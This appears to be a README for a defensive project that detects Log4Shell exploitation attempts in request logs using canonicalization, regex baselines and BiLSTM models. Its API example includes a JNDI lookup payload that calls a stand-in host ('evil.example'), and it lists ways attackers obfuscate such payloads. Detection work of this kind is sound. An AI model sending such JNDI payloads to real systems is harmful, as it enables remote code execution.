# LogShield AI

Obfuscation-resistant Log4Shell detection for HTTP/request-derived logs using canonicalization, signature baselines, character-level Bidirectional Long Short-Term Memory (BiLSTM) models, fair split evaluation, live monitoring, an API, and a dashboard.

## Project Overview

LogShield AI is a defensive security product prototype for detecting Log4Shell exploitation attempts visible in web request logs. It is focused on one task: classifying request-derived log lines as benign, suspicious, or malicious when attackers hide Java Naming and Directory Interface (JNDI) payloads with URL encoding, nested lookups, environment fallbacks, mixed case, Unicode escapes, or fragmented tokens.

## Why Log4Shell Still Matters

Log4Shell remains relevant because old Java applications, embedded dependencies, and internet-facing services may still contain vulnerable Apache Log4j versions. This project does not prove successful exploitation and does not replace patching. It detects exploitation attempts that are visible in logs and helps defenders triage suspicious traffic.

## System Architecture

```text
HTTP Requests / Access Logs
  -> Log Collector
  -> Preprocessing and Canonicalization Engine
  -> Feature Builder
  -> Detection Engine
     -> Regex / Signature Baseline
     -> Raw BiLSTM
     -> Normalized BiLSTM
     -> BiLSTM + Attention
  -> Risk Scoring
  -> Live Alerts
  -> API / Dashboard / Report
```

## Dataset Strategy

Processed datasets use this shared schema:

```text
id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
```

Build the dataset:

```bash
make data
```

Generated files include `train.csv`, `val.csv`, `test.csv`, `unseen_obfuscation_test.csv`, `adversarial_evasion_test.csv`, `hard_negative_test.csv`, external validation files, `external_benign_web_test.csv`, `blind_manual_test.csv`, and `ood_stress_test.csv`.

## Obfuscation Taxonomy

The dataset includes plain JNDI payloads, LDAP/RMI/DNS/LDAPS protocols, mixed case, URL encoding, double URL encoding, triple URL encoding, Unicode escape sequences, nested lower/upper lookups, environment fallback syntax, fragmented tokens, zero-width character injection, Unicode homoglyph substitution, HTML entity encoding, context-embedded payloads, and documentation-like hard negatives.

## Preprocessing and Canonicalization

`src/detector/canonicalizer.py` performs repeated URL decoding, HyperText Markup Language (HTML) entity decoding, Unicode escape decoding, lowercase normalization, control-character cleanup, whitespace normalization, lookup resolution, and canonical signal extraction.

## Model Architectures

The main model remains a character-level BiLSTM. The repository also supports a normalized BiLSTM, BiLSTM with attention, optional canonical-signal input, optional character Convolutional Neural Network (Char-CNN), and regex baseline.

Train all neural models:

```bash
make train
```

For a faster smoke run:

```bash
python3 scripts/train_all.py --epochs 1 --sample-limit 800
```

Calibrate thresholds on validation data:

```bash
make calibrate
```

The calibration output is saved to `models/thresholds.json`. Neural model thresholds are selected on validation F1.

## Evaluation Protocol

Evaluation reports accuracy, precision, recall, F1-score, Receiver Operating Characteristic Area Under the Curve (ROC-AUC), Precision-Recall Area Under the Curve (PR-AUC), false positive rate, false negative rate, latency, and throughput. The comparison includes a canonicalized regex baseline and neural detectors so the evasion contribution is visible without relying on a combined rule/model score.

```bash
make evaluate
make ablation
```

Outputs are written to `results/final_comparison.csv`, `results/ablation_table.csv`, `results/error_analysis.csv`, and `results/plots/`. The comparison file includes threshold, confusion-matrix counts, support, latency, and throughput. `results/plots/evasion_analysis.png` summarizes standard-test versus adversarial-evasion recall. Single-class external, hard-negative, or evasion-only sets intentionally report `NaN` for Receiver Operating Characteristic Area Under the Curve (ROC-AUC) and Precision-Recall Area Under the Curve (PR-AUC).

`ood_stress_test.csv` is a frozen-model stress split: it is generated after training and is not used for training, validation, regex tuning, threshold calibration, or model selection. It contains new malicious evasion families and benign display-only payload examples to expose generalization and false-positive limits.

Latest local run:

| Detector | Standard F1 | Adversarial Evasion Recall | Adversarial Evasion F1 | Frozen OOD F1 | Frozen OOD FPR | Hard-Negative FPR |
| --- | ---: | ---: | ---: | ---: | ---: | ---: |
| Regex Baseline | 1.000 | 0.727 | 0.842 | 0.200 | 0.500 | 0.478 |
| Raw BiLSTM | 1.000 | 0.909 | 0.952 | 0.783 | 0.167 | 0.000 |
| Normalized BiLSTM | 1.000 | 0.909 | 0.952 | 0.545 | 0.333 | 0.000 |
| BiLSTM + Attention | 1.000 | 1.000 | 1.000 | 0.468 | 0.000 | 0.000 |

The frozen OOD stress result is intentionally harder than the main benchmark. Hard-negative and external-format benign training reduce false positives substantially: the hard-negative test FPR is 0.000 for the neural detectors, and all neural detectors produce 0 false positives on the 200-row public Elastic Apache benign external split. Raw BiLSTM is the best final balance with OOD F1 0.783 and external malicious recall 1.000 across 65 public/fetched malicious rows. BiLSTM + Attention gives the lowest OOD FPR, but its OOD malicious recall is lower, so it is reported as a conservative variant rather than the main model.

## Live Demo

Run a local simulation:

```bash
python3 scripts/live_monitor.py --simulate
```

Scan a file:

```bash
python3 scripts/scan_file.py --file demo/demo_payloads.txt
```

## API Usage

```bash
make api
curl -X POST http://localhost:8000/predict \
  -H "Content-Type: application/json" \
  -d '{"log":"GET /?x=${jndi:ldap://evil.example/a}"}'
```

Endpoints:

- `GET /`
- `GET /health`
- `POST /predict`
- `POST /batch-predict`
- `POST /explain`
- `GET /metrics`

## Dashboard

```bash
make dashboard
```

If the default Streamlit port is already busy during recording, run:

```bash
streamlit run dashboard/app.py --server.address 127.0.0.1 --server.port 8502
```

The Streamlit dashboard provides a presentation-ready flow: Overview, Live Detection, Model Comparison, Adversarial Testing, Batch Scanner, and Alert History. Curated demo inputs are stored in `demo/presentation/sample_logs.json` so the live demo can quickly switch between benign, malicious, encoded, nested, evasion, and hard-negative examples. For the video, start with Overview, run the guided scenario on Live Detection, then use Adversarial Testing to show a regex-miss payload that the Raw BiLSTM detector still marks as critical.

## Reproducibility

Full reproduction:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
make data
python3 scripts/train_all.py --epochs 8 --batch 64
make calibrate
make evaluate
make ablation
make report
make test
```

Faster smoke run:

```bash
python3 scripts/train_all.py --epochs 1 --sample-limit 800
make calibrate evaluate ablation report test
```

Docker demo:

```bash
docker compose up --build
```

Services expose the API on `http://localhost:8000`, dashboard on `http://localhost:8501`, and vulnerable demo app on `http://localhost:8080`. Docker ports are bound to `127.0.0.1` for localhost-only educational use.

## Submission Artifacts

- `paper/log4shell_bilstm_ieee.pdf`
- `docs/experiment_report.md`
- `docs/submission_checklist.md`
- `results/final_comparison.csv`
- `results/ablation_table.csv`
- `results/error_analysis.csv`
- `results/plots/`
- `results.zip`

## Limitations

The dataset is mixed-source and partially synthetic. Real-world labeled HTTP Log4Shell datasets are limited. The adversarial evasion rows model attacker intent visible in logs and signature-bypass pressure; they do not prove successful runtime exploitation. The detector may miss unknown obfuscation strategies. It supports, but does not replace, patch management, dependency inventory, egress monitoring, and runtime protections.

## Ethical Use

This project is for defensive education, detection engineering, and reproducible lab demonstrations. All demo services are intended for localhost-only educational use. The project does not include weaponized LDAP/RMI callback infrastructure and does not demonstrate successful exploitation.
